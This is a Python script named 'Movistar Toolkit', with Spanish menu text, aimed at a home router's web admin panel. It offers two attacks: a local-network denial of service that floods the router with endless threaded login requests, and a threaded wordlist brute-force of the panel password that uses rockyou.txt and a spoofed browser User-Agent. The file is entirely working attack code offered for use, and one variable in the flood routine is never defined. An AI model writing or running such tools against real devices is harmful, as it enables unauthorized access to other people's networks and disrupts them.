from colorama import init, Fore, Style, Back
import requests
import os
import threading
from time import sleep
import string
import random
import re

session = requests.Session()

init(convert=True)
init(autoreset=True)

bright = Style.BRIGHT
dim = Style.DIM
red = Fore.RED + bright + dim
green = Fore.GREEN + bright + dim
cyan = Fore.CYAN + bright + dim
yellow = Fore.LIGHTYELLOW_EX + bright + dim
blue = Fore.BLUE + bright + dim
magenta = Fore.MAGENTA + bright + dim

# Config
ROUTER_URL = "http://192.168.1.1/"
LOGIN_URL = "te_acceso_router.cgi"
CHECK_URL = "te_acceso_router.html"
THREAD_COUNT = 2
WORDLIST_FILE = "rockyou.txt"
WORDLIST_DELAY = 0.8

fakeHeader = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
parametrosLogin = {
    "Upgrade-Insecure-Requests": "1",
    "loginPassword": ""
}

session = requests.Session()

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def brute_start(passw):
    req = session.get(ROUTER_URL, headers=fakeHeader)

    parametrosLogin["loginPassword"] = passw
    iniReq = session.post(ROUTER_URL+LOGIN_URL, headers=fakeHeader, params=parametrosLogin)

    errorResponse = iniReq.text
    errorStatus = iniReq.status_code
    errorCookie = session.cookies.get_dict()

    print("Generated cookie: {}".format(errorCookie))
    print("Current password: {}".format(passw))

    logReq = session.post(ROUTER_URL+LOGIN_URL, headers=fakeHeader, params=parametrosLogin)

    if logReq.text != errorResponse:
        print(green +"Different response:")
        print(logReq.text)
        input()

    if errorStatus != logReq.status_code:
        print(green + "Different status code: {}".format(logReq.status_code))
        input()

    checkReq = session.get(ROUTER_URL+CHECK_URL, headers=fakeHeader)

    m = re.search('var bruteTime = \'(.+?)\';', checkReq.text)
    if m:
        found = m.group(1)
        print("Bruteforce timer: {}".format(found))

def dos_start(count):
    try:
        iniReq = session.get(ROUTER_URL, headers=fakeHeader)
        logReq = session.post(ROUTER_URL+LOGIN_URL, headers=fakeHeader, params=parametrosLogin)
        checkReq = session.get(ROUTER_URL+CHECK_URL, headers=fakeHeader)
        print("{}{}{} solicitudes enviadas al router".format(cyan, count, white))
    except ConnectionResetError:
        print("Se ha perdido la conexion con el router")
    except Exception as e:
        print("Error no especificado")
        print(e)

def brute_main():
    f = open(WORDLIST_FILE, "r", encoding="utf8", errors="ignore")
    content = f.read()
    content_list = content.splitlines()
    f.close()

    for passw in content_list:
        thread = threading.Thread(target=brute_start, args=[passw])
        thread.start()
        sleep(WORDLIST_DELAY)

def dos_main():
    count = 3
    while True:
        thread = threading.Thread(target=dos_start, args=[count])
        thread.start()
        count += 3

def main():
    cls()

    print("{}\n\nMovistar Toolkit\n\n".format(Back.BLUE))
    print("{}1.- DOS red local".format(cyan))
    print("{}2.- Ataque wordlist del panel wifi".format(cyan))
    opcion = input("\n> Seleciona una opcion (1-2): ")

    print("\n")
    if opcion == "1":
        dos_main()
    elif opcion == "2":
        brute_main()
    else:
        print(red + "Opcion invalida. Debes introducir un numero (1-2)")
        input()
        main()

main()
